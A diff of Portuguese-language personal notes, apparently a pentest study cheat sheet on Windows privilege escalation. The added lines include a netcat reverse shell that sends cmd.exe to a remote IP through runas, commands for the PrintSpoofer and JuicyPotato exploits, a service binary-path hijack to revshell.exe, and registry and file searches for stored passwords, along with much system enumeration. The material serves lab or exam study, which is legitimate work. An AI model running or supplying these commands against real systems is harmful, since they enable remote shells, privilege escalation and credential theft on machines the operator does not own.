@@ -45,10 +45,18 @@ $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
 $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
 new-pssession -computername . -credential $cred
 ```
+Ainda outra opção seria com runas:
+
+```
+runas/user:acosta ".\nc64.exe -e C:\windows\system32\cmd.exe 192.168.0.165 8083"
+```
+
 
 ## Kernel exploitation
 
 https://github.com/SecWiki/windows-kernel-exploits
+
+    Winver 
 
 ```
 systeminfo > si.txt
@@ -71,6 +79,48 @@ wes si.txt
 
 Pesquisas no google
 
+## User Permissions (whoami /priv)
+
+Teste basiquinho primeiro, porque mudei de ideia:
+
+```
+whoami /priv
+```
+
+Aqui vale considerar os exploits Potatoes:
+
+```
+PrintSpoofer32.exe -i -c powershell
+```
+
+O exploit abaixo tem que considerar as portas abertas no firewall para ele funcionar adequadamente:
+
+```
+./jp.exe -t * -p c:\temp\s.bat [-l porta]
+```
+```
+whoami /priv
+
+SeImpersonate
+
+PrintSpoofer32.exe -i -c powershell
+
+JuicyPotato.exe -t * -p shell.bat -l 4444
+
+jp.exe -t * -p shell.bat -l 4444
+
+whoami /all
+
+SE IMPERSONATE
+```
+**LEMBRAR DE QUE AS PORTAS UTILIZADAS NO COMANDO DEVEM ESTAR LIBERADAS NO FIREWALL.**
+
+Esse juicyPotato que funcionou é o que se encontra neste link:
+
+[https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip](https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip)
+
+agora sim uma checada nos diretórios da máquina:
+
 ## DirectoryEnum
 
 ```
@@ -79,6 +129,22 @@ cd c:\users
 dir
 #Tentar esta abordagem durante a prova pode ser mais interessante
 dir /s /b /a:-d-h \Users\alfred | findstr /i /v "appdata"
+```
+```
+gci -recurse -filter <file_name> [-Path]
+```
+
+```
+cd c:\users
+gci -recurse
+```
+
+```
+dir /s /b /a:-d-h \Users\alfred | findstr /i /v "appdata"
+```
+
+```
+gci 'c:\program files','c:\program files (x86)' | ft name, path, lastwritetime
 ```
 
 ![qownnotes-media-PvAXBV](../media/qownnotes-media-PvAXBV.png)
@@ -107,26 +173,6 @@ Depois de enumerar, eh interessante montarmos o volume pra verificar se temos al
 
 mountvol G: \\?\Volume{ff136f5c-4935-11e9-80b5-806e6f6e6963}\
 ```
-
-## UserPrivileges
-
-```
-whoami /priv
-
-SeImpersonate
-
-PrintSpoofer32.exe -i -c powershell
-
-JuicyPotato.exe -t * -p shell.bat -l 4444
-
-jp.exe -t * -p shell.bat -l 4444
-
-whoami /all
-
-SE IMPERSONATE
-```
-
-https://github.com/topics/seimpersonateprivilege https://jlajara.gitlab.io/Potatoes\_Windows\_Privesc#sweetPotato
 
 ## Winpeas
 
@@ -289,7 +335,9 @@ tasklist /v /fi "username eq system"
 Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
 ```
 
-## Enumerate device derivers
+    Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+
+## Enumerate device drivers
 
 ```
 driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object Display Name, Start Mode, Path
@@ -298,3 +346,76 @@ Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, M
 
 Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
 ```
+
+    mountvol
+
+Depois dee enumerar, eh interessante montarmos o volume pra verificar se temos algo.
+
+    mountvol G: \\?\Volume{ff136f5c-4935-11e9-80b5-806e6f6e6963}\
+
+
+## firwewall rules enumeration
+
+    netsh advfirewall show currentprofile
+    
+    netsh advfirewall firewall show rule name=all
+    
+     Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+    
+    
+## Services enumeration and Network information
+
+A presença de interfaces virtuais pode aferir a ideia de existir máquinas virtuais na máquina ou de anti vírus instalado.
+
+    ipconfig /all
+    route print
+    netstat -ano #(process ID como -o, requer privilégios administrativos)
+    netstat -anb #(nome do binário com o -b, requer privilégios administrativos)
+
+### Weak service permissions
+
+![qownnotes-media-jCADRm](../../media/qownnotes-media-jCADRm.png)
+
+![qownnotes-media-Yhpwrk](../../media/qownnotes-media-Yhpwrk.png)
+
+    ./accesschk.exe -ucwqv UsoSvc /accepteula
+    
+    ./accesschk.exe -ucwqv <servicename> /accepteula
+    
+Com esse comando, verificamos que estamos no grupo NTAUTHORITY/SERVICE
+    
+    whoami /all
+
+![qownnotes-media-zdSaRr](../../media/qownnotes-media-zdSaRr.png)
+
+    sc.exe config usosvc binpath="C:\temp\revshell.exe"
+
+![qownnotes-media-QfiKZv](../../media/qownnotes-media-QfiKZv.png)
+
+    net stop usosvc
+    net start usosvc
+
+## PasswordEnumeration
+
+    findstr /si password *.doc *.txt *.ini *.config
+    
+    gci -recurse -filter passwd*
+    
+    dir /s *pass* == *cred* == *ssh* == *.config*
+    
+    reg query HKLM /f *password* /t REG_SZ /s
+    
+    reg query HKLM /f teamviewer /t REG_SZ /s
+    
+    reg query HKCU /f password /t REG_SZ /s
+    
+    
+    Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
+    
+    driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
+    
+    Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
+ 
+### Writable files
+ 
+     Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
